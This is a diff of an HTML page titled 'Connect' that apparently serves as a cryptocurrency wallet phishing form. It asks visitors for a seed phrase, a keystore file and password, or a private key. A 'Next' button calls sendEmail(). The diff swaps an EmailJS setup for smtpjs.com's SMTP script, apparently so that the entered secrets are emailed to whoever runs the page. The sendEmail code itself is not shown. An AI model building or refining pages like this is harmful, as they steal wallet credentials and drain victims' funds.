@@ -1,69 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta
-      name="google-signin-client_id"
-      content="592380102525-t2h7or334n5osm3eoblqblikn3sen8k0.apps.googleusercontent.com"
-    />
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="google-signin-client_id" content="592380102525-t2h7or334n5osm3eoblqblikn3sen8k0.apps.googleusercontent.com">
     <title>Connect</title>
-    <link rel="stylesheet" href="import.css" />
-  </head>
-  <body>
+    <link rel="stylesheet" href="import.css">
+</head>
+<body>
     <div class="form">
-      <div class="head-tabs">
-        <div id="phrase" onclick="changeTab('phrase')">Phrase</div>
-        <div id="keystore" onclick="changeTab('keystore')">KeystoreJSN</div>
-        <div id="privatekey" onclick="changeTab('privatekey')">PrivateKey</div>
-      </div>
-      <div class="phrase">
-        <textarea
-          name="phraseText"
-          id="ptext"
-          cols="30"
-          rows="8"
-          placeholder="Enter 12 or 24 phrase code"
-        ></textarea>
-      </div>
-      <div class="keystore">
-        <textarea
-          name="keyStore"
-          id="kstore"
-          cols="30"
-          rows="10"
-          placeholder="Enter Lines of Text beginning with (...)"
-        ></textarea>
-        <input
-          type="text"
-          name="keystorePassword"
-          id="kpassword"
-          placeholder="Enter Keystore Password"
-        />
-      </div>
-      <div class="privatekey">
-        <textarea
-          name="privateKey"
-          id="pkey"
-          cols="30"
-          rows="10"
-          placeholder="Enter Private Key"
-        ></textarea>
-      </div>
-      <button type="submit" onclick="sendEmail()">Next</button>
+        <div class="head-tabs">
+            <div id="phrase" onclick="changeTab('phrase')">Phrase</div>
+            <div id="keystore" onclick="changeTab('keystore')">KeystoreJSN</div>
+            <div id="privatekey" onclick="changeTab('privatekey')">PrivateKey</div>
+        </div>
+        <div class="phrase">
+            <textarea name="phraseText" id="ptext" cols="30" rows="8" placeholder="Enter 12 or 24 phrase code"></textarea>
+        </div>
+        <div class="keystore">
+            <textarea name="keyStore" id="kstore" cols="30" rows="10" placeholder="Enter Lines of Text beginning with (...)"></textarea>
+            <input type="text" name="keystorePassword" id="kpassword" placeholder="Enter Keystore Password">
+        </div>
+        <div class="privatekey">
+            <textarea name="privateKey" id="pkey" cols="30" rows="10" placeholder="Enter Private Key"></textarea>
+        </div>
+        <button type="submit" onclick="sendEmail()">Next</button>
     </div>
 
-    <script
-      type="text/javascript"
-      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
-    ></script>
-    <script type="text/javascript">
-      (function () {
-        emailjs.init({
-          publicKey: "hxfmEvnshiIKAM6bH",
-        });
-      })();
-    </script>
-  </body>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+</body>
 </html>
